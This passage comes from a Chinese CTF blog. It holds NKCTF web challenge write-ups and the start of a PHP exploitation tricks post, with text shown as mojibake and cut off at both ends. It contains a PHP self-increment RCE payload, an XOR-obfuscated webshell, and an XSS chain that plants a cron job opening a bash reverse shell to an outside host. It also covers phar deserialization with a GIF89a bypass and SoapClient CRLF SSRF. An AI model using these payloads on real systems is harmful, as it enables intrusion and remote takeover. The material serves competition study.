1342c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h4><p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">å‚è€ƒé“¾æ¥</a></p><p>binç›®å½•ä¸‹è²Œä¼¼ç¼ºä¸€äº›å‘½ä»¤ï¼Œtac &#x2F;flagå°±å¯ä»¥äº†ã€‚</p><p>tac &#x2F;flag</p><h4 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h4><p>å¸¸è§çš„å–å~ï¼Œå¼‚æˆ–^éƒ½è¢«è¿‡æ»¤ï¼Œä½†æ˜¯[ ]+$å¯ä»¥ç”¨ï¼Œé€šè¿‡è‡ªå¢çš„æ–¹æ³•è¿›è¡ŒRCEç»•è¿‡ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//ç”¨ ___ ä»£æ›¿ 0</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>_<span class="token operator">/</span>_<span class="token punctuation">.</span>_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// NAN å– N</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// PO</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">/</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _.POST</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//$_POST[___]($_POST[_])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å»æ‰æ¢è¡Œå’Œæ³¨é‡Šå³å¯,æ³¨æ„urlç¼–ç ã€‚</p><p>æŸ¥çœ‹phpinfoå‘ç°disable_functionè¿‡æ»¤äº†å¾ˆå¤šï¼Œç›´æ¥readfileç›²æ‰“æˆåŠŸã€‚</p><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">NKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=readfile&amp;_=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h4><p>åˆæ˜¯pharï¼Œç›´æ¥å¤ç°å°±å®Œäº‹å„¿äº†ã€‚</p><p><a href="https://xz.aliyun.com/t/11798">ä¼ é€é—¨</a></p><p>å› ä¸ºæ˜¯ç”¨æ–°ä¹°çš„ç¬”è®°æœ¬æ‰“çš„ï¼Œphpç¯å¢ƒå•¥çš„éƒ½æ²¡è£…ã€‚ä¿®æ”¹phar.readonlyæµªè´¹äº†ä¿©å°æ—¶çš„æ—¶é—´ï¼Œå°¼ç›php.iniçš„ä¼˜å…ˆçº§ç«Ÿç„¶ä¸æ˜¯æœ€é«˜çš„ã€‚</p><h4 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h4><p>ç¬‘å˜»äº†ã€‚ç¯å¢ƒä¸€å¼€å§‹ä¸æ˜¯è¿™æ ·çš„ï¼Œå¼±å£ä»¤ä¹Ÿä¸æ˜¯adminã€‚åæ¥å†å¼€äº†ä¸€éå‘ç°ç¯å¢ƒå˜äº†ï¼Œè®¿é—®&#x2F;dedeï¼Œadmin&#x2F;adminç™»å½•åå°ã€‚</p><p>æ£€ç´¢çš„è¿‡ç¨‹ä¸­ç«Ÿç„¶å‘ç°æœ‰åå°RCEæ¼æ´ï¼Œæˆ‘å¯»æ€ä½ éƒ½æœ€é«˜æƒé™è¿›åå°äº†ï¼Œç›´æ¥è¿›ç³»ç»Ÿè®¾ç½®-&gt;å…¶å®ƒè®¾ç½®æŠŠè¿‡æ»¤çš„ä¸œè¥¿åˆ äº†ï¼Œç„¶åè¿›å…¥é™„ä»¶è®¾ç½®ï¼Œè®¾ç½®å…è®¸ä¼ å…¥phpã€‚</p><p>æœ‰ä¸ªæ£€æµ‹ä¸€å¥è¯çš„wafï¼Œå…æ€ä¸€å¥è¯å¾ˆå¤šï¼Œéšä¾¿æä¸€ä¸ªä¼ ä¸Šå»å³å¯ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> $<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">// ?k=system        POST:k=cat /f1Aggg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h4><p>è®¿é—®404ï¼Œç¾¤ä¸»è¯´ä¸éœ€è¦çˆ†ç ´æ‰«æï¼Œé‚£å°±æœ¬åœ°å¼€ä¸€ä¸ªå°çš®çœ‹ä¸€çœ‹åˆ°åº•æœ‰ä»€ä¹ˆä¸ä¸€æ ·ã€‚</p><p>å°çš®æ—¥å¿—xss RCEï¼Œç™»å½•è¯·æ±‚ä¼šè¢«æ—¥å¿—è®°å½•ä¸‹æ¥ï¼ŒåŠ è½½é¡µé¢ä¼šè¯»å–æ—¥å¿—å¹¶ä¸”æ¸²æŸ“å‡ºæ¥ï¼Œè€Œå°çš®åå°å¯ä»¥å†™å®šæ—¶ä»»åŠ¡ï¼Œå› æ­¤æˆ‘ä»¬åªè¦å¼•å…¥ä¸€ä¸ªæ¶æ„xssï¼Œadminç™»é™†è¿›å»è§¦å‘xssï¼Œå†™å…¥å®šæ—¶ä»»åŠ¡å³å¯RCEã€‚</p><p>åæ¥å‘ç°å°‘ä¸€ä¸ªè¯·æ±‚å¤´X-Requested-Withï¼Œæ·»åŠ ä¸Šå°±å¯ä»¥äº†ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1679900305410.png" alt="1679900305410" style="zoom: 33%;" /><p>ç»è¿‡ä¸€ç•ªæµ‹è¯•å‘ç°ä¸æ˜¯å¼±å£ä»¤ï¼Œä½†é¢˜ç›®è¯´ï¼šä¹‹åçš„æ¯ä¸€å¤©è¿˜æ€»æ˜¯ç™»å½•åˆ°åå°å»éƒ¨ç½²æœåŠ¡ã€‚å› æ­¤æˆ‘ä»¬åªè¦å¼•å…¥ä¸€ä¸ªxsså°±å¥½äº†ã€‚</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=task_list'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> id<span class="token operator">=</span>data<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ID<span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=exec_task'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>      tid<span class="token punctuation">:</span>id    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/log.php?type=clearlog'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>task_id<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>exec_cycle<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>week<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>day<span class="token operator">=</span><span class="token string">"3"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>hour<span class="token operator">=</span><span class="token string">"15"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token string">"40"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å®šæ—¶ä»»åŠ¡æ—¶é—´è®¾ç½®è¦å¯¹</span>  data<span class="token punctuation">.</span>shell<span class="token operator">=</span><span class="token string">'bash -i >&amp; /dev/tcp/x.x.x.x/330 0>&amp;1'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//é—®äº†ä¸€ä¸‹æ±ªæ±ªé˜Ÿå¸ˆå‚…ï¼Œå‚»é€¼äº†å¿˜è®°æœ‰å¼¹shellè¿™ä¸ªæ“ä½œäº†ï¼Œçœ‹æ¥è¿˜æ˜¯å¾—ç»å¸¸æ‰“æ¯”èµ›ã€‚</span>  $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=save_shell'</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é™¤äº†å¯†ç å­¦å…¶ä»–æ–¹å‘åº”è¯¥éƒ½ä¸éš¾æã€‚</p><p>å’Œä¹™ç»„çš„å¸ˆå‚…ä¸´æ—¶ç»„çš„å¤•é˜³çº¢é˜Ÿä¼ï¼Œæ°´å¹³åº”è¯¥åœ¨ä¹™ç»„åˆçº§~ä¸­çº§è¿™ä¸ªåŒºé—´ã€‚æ¯”èµ›çš„æ—¶å€™å¸ˆå…„è¾¹å‡†å¤‡å¼€é¢˜æŠ¥å‘Šè¾¹reï¼Œæˆ‘ä»¬ä¹Ÿè¦å†™ä½œä¸šå¿™ç§‘ç ”é¡¹ç›®ï¼Œåœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹èƒ½åœ¨ä¸€èµ·è®¨è®ºæ¯”èµ›æå‡æŠ€æœ¯çœŸæ˜¯å¤ªå¥½äº†ã€‚å¸Œæœ›ä»¥åæ¯ä¸ªæœˆéƒ½èƒ½æ‰“ä¸€åœºæã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPçš„ä¸€äº›trick</title>
      <link href="/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/"/>
      <url>/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPçš„ä¸€äº›trick"><a href="#PHPçš„ä¸€äº›trick" class="headerlink" title="PHPçš„ä¸€äº›trick"></a>PHPçš„ä¸€äº›trick</h1><blockquote><p>ä¼šé•¿æœŸæ›´æ–°çš„ç³»åˆ—ï¼Œè‡ªç”¨ã€‚</p></blockquote><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><h4 id="Magic-method"><a href="#Magic-method" class="headerlink" title="Magic method"></a>Magic method</h4><ul><li>æ„é€ å‡½æ•° <code>__construct</code> å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è°ƒç”¨</li><li>ææ„å‡½æ•° <code>__destruct</code> å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è°ƒç”¨</li><li>æ–¹æ³•é‡è½½ <code>__call</code> åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li><li>æ–¹æ³•é‡è½½ <code>__callStatic</code> åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li><li>åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</li><li>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</li><li>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>isset()</code> æˆ– <code>empty()</code> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨</li><li>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>unset()</code> æ—¶ï¼Œ<code>__unset()</code> ä¼šè¢«è°ƒç”¨</li><li><code>__sleep()</code> åœ¨<code>serialize()</code> å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨</li><li><code>__wakeup()</code> åœ¨<code>unserialize()</code> å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨</li><li><code>__toString</code> åœ¨ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨ï¼ˆä¸ä»…ä»…æ˜¯echoçš„æ—¶å€™,æ¯”å¦‚file_exists()åˆ¤æ–­ä¹Ÿä¼šè§¦å‘</li></ul><h4 id="Primitive-class"><a href="#Primitive-class" class="headerlink" title="Primitive class"></a>Primitive class</h4><p><strong>è¯»æ–‡ä»¶åï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token string">'/f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>è¯»æ–‡ä»¶ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><blockquote><p>æ²¡æœ‰unserialize()æ—¶æˆ–è®¸å¯ä»¥é€šè¿‡pharè¿›è¡Œååºåˆ—åŒ–ã€‚</p></blockquote><p><strong>è§¦å‘pharçš„å‡½æ•°ï¼š</strong></p><table><thead><tr><th>èƒ½å¤Ÿåˆ©ç”¨çš„å‡½æ•°</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p><strong>åˆ©ç”¨pharçš„æ¡ä»¶ï¼š</strong></p><p>1ï¼‰pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨</p><p>2ï¼‰è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä¸ºè·³æ¿</p><p>3ï¼‰æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸” : ã€ &#x2F; ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</p><p>4ï¼‰phpç‰ˆæœ¬å°äº8</p><p><strong>ç”Ÿæˆpharè„šæœ¬ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ç”Ÿæˆphar.phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è®¾ç½®stubï¼Œ&lt;?php å‰çš„å­—ç¬¦æ— æ‰€è°“ï¼ŒGIF89aç»•è¿‡å›¾ç‰‡å¤´</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å†™å…¥metadata</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ç­¾å</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SoapClient-call-ååºåˆ—åŒ–-CRLFæ‰“SSRF"><a href="#SoapClient-call-ååºåˆ—åŒ–-CRLFæ‰“SSRF" class="headerlink" title="SoapClient::__call+ååºåˆ—åŒ–+CRLFæ‰“SSRF"></a>SoapClient::__call+ååºåˆ—åŒ–+CRLFæ‰“SSRF</h4><blockquote><p>å¦‚æœåœ¨ä»£ç å®¡è®¡ä¸­æœ‰ååºåˆ—åŒ–ç‚¹ï¼Œä½†åœ¨ä»£ç ä¸­æ‰¾ä¸åˆ°popé“¾ï¼Œå¯ä»¥åˆ©ç”¨phpå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ï¼ŒSoapClientæ‰“SSRFæ¯”è¾ƒå¸¸è§ã€‚</p></blockquote><p>é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„<code>SoapClient</code>ç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨<code>__call</code>æ–¹æ³•ï¼Œé‚£ä¹ˆ<code>__call</code>æ–¹æ³•ä¼šPOSTä¸€ä¸ªæœ¬åœ°è¯·æ±‚ä»è€Œç»•è¿‡æœ¬æœºipæ ¡éªŒã€‚</p><p><strong>CRLFæ³¨å…¥ä»»æ„è¯·æ±‚å¤´ï¼š</strong></p><p>ç”¨å®‰æ´µæ¯çš„ä¸€é“é¢˜åšç¤ºèŒƒã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg";</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"123"</span><span class="token punctuation">,</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaaa\r\nCookie: PHPSESSID=123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token 